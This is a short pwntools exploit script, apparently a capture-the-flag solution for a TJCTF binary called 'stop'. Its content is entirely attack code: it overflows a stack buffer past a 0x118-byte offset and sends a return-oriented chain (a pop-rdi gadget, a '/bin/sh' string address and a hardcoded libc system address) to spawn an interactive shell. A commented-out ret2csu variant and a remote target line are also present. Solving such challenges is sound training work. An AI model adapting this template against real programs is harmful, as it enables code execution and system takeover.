from pwn import *

context.update(log_level = 'debug')
p = process('stop')
#p = remote('p1.tjctf.org', 8001)

e = ELF('stop')

addr_got_printf = e.got['printf']
addr_plt_printf = e.plt['printf']


log.info('addr_got_printf:' + hex(addr_got_printf))
log.info('addr_plt_printf:' + hex(addr_plt_printf))


offset_toRET = 0x110 + 8

#letter
p.sendlineafter('letter? ', 'a')


addr_test = 0x04007A7
addr_test_printf = 0x4007b3
#0x00400951 : (b'5e415fc3')	pop rsi; pop r15; ret
addr_popRSI = 0x400951
addr_popRDI = 0x00400953
addr_binsh = 0x400A1A
addr_initSet = 0x40094A #reg 6
addr_initCall = 0x400939 #call r12 + rbx*8
addr_libc_system = 0x7ffff7a33440
#send payload
#payload = 'a'*offset_toRET + p64(addr_initSet) + p64(0)*2 + p64(addr_got_printf) + p64(0)*3 + p64(addr_initCall) + p64(0)*6
payload = 'a'*offset_toRET + p64(addr_popRDI) + p64(addr_binsh) + p64(addr_libc_system)

#raw_input('pid: ' + str(p.pid))
p.sendlineafter('Category? ', payload)


p.interactive()
